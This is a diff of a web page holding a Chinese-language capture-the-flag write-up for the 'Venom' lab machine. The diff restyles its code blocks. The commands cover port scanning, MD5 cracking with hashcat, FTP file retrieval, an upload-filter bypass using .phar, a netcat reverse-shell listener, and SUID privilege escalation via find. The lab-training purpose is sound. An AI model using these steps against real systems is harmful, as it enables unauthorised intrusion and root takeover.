@@ -171,14 +171,14 @@ ftp 10.10.10.6 binary 进入 二进制 模式">
         <h1 id="服务扫描">服务扫描</h1>
 <h2 id="使用-nmap-进行基础扫描">使用 nmap 进行基础扫描</h2>
 <p>扫描所执行的命令，执行结果如下</p>
-<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
-
-sudo nmap --min-rate 10000 -p- 10.10.10.31   
-
-sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
-
-sudo nmap --script=vuln -p22,80 10.10.10.31 
-</code></pre><p><img src="content/posts/Venom%20Writeup/P1.png" alt="P1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn 10.10.10.0/24
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.10.10.31   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nmap --script<span style="color:#f92672">=</span>vuln -p22,80 10.10.10.31 
+</span></span></code></pre></div><p><img src="content/posts/Venom%20Writeup/P1.png" alt="P1"></p>
 <p>21 端口开放了 ftp 服务，在找到账号密码后可进行 登入 ，
 靶机还开放了 smb 服务，可进行更详细的 smb 扫描，</p>
 <p>查看 80 端口，是 Ubuntu 的默认界面</p>
@@ -187,23 +187,23 @@ sudo nmap --script=vuln -p22,80 10.10.10.31
 <p><img src="P3.png" alt="P3"></p>
 <p><img src="P4.png" alt="P4"></p>
 <p>使用 hashcat 破解</p>
-<pre tabindex="0"><code>sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
-</code></pre><p><img src="P9.png" alt="P9"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> Hash/md5.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><img src="P9.png" alt="P9"></p>
 <p><img src="P10.png" alt="P10"></p>
 <p>使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger</p>
-<pre tabindex="0"><code>ftp 10.10.10.6
-</code></pre><p><img src="P11.png" alt="P11"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp 10.10.10.6
+</span></span></code></pre></div><p><img src="P11.png" alt="P11"></p>
 <p>binary 进入 二进制 模式</p>
-<pre tabindex="0"><code>binary
-</code></pre><p>获取文件</p>
-<pre tabindex="0"><code>ls -liah
-
-cd files
-
-get hint.txt
-
-exit
-</code></pre><p><img src="P12.png" alt="P12"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binary
+</span></span></code></pre></div><p>获取文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -liah
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd files
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get hint.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><p><img src="P12.png" alt="P12"></p>
 <p>查看下载下来的 txt 文件</p>
 <p><img src="P14.png" alt="P14"></p>
 <p>你需要跟随 &lsquo;hostinger&rsquo; 两个 base64 编码解密如下</p>
@@ -222,24 +222,24 @@ exit
 <p>php 被过滤了，尝试不常见的 php 后缀，发现 phar 没被过滤</p>
 <h1 id="linux-提权">Linux 提权</h1>
 <p>kali 建立 监听</p>
-<pre tabindex="0"><code>sudo nc -lvnp 4444
-</code></pre><p><img src="P23.png" alt="P23">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><img src="P23.png" alt="P23">
 ![content/posts/Venom Writeup/P24](content/posts/Venom Writeup/P24.png)</p>
 <p>查看 passwd ，寻找 拥有 bash 环境 的用户</p>
 <p><img src="P25.png" alt="P25"></p>
 <p>切换成 hostinger 用户</p>
-<pre tabindex="0"><code>su hostinger
-</code></pre><p>在 /var/www/html/subrion/backup 下发现了一个密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su hostinger
+</span></span></code></pre></div><p>在 /var/www/html/subrion/backup 下发现了一个密码</p>
 <p><img src="P26.png" alt="P26"></p>
 <p>尝试切换为 nathan 用户</p>
 <p>查看具有 s 位 的可执行文件</p>
-<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
-</code></pre><p><img src="P27.png" alt="P27"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p><img src="P27.png" alt="P27"></p>
 <p>使用 find 提权</p>
-<pre tabindex="0"><code>sudo install -m =xs $(which find) .
-
-./find . -exec /bin/bash -p \; -quit
-</code></pre><p><img src="P28.png" alt="P28"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo install -m <span style="color:#f92672">=</span>xs <span style="color:#66d9ef">$(</span>which find<span style="color:#66d9ef">)</span> .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./find . -exec /bin/bash -p <span style="color:#ae81ff">\;</span> -quit
+</span></span></code></pre></div><p><img src="P28.png" alt="P28"></p>
 
       </div>
     </article>
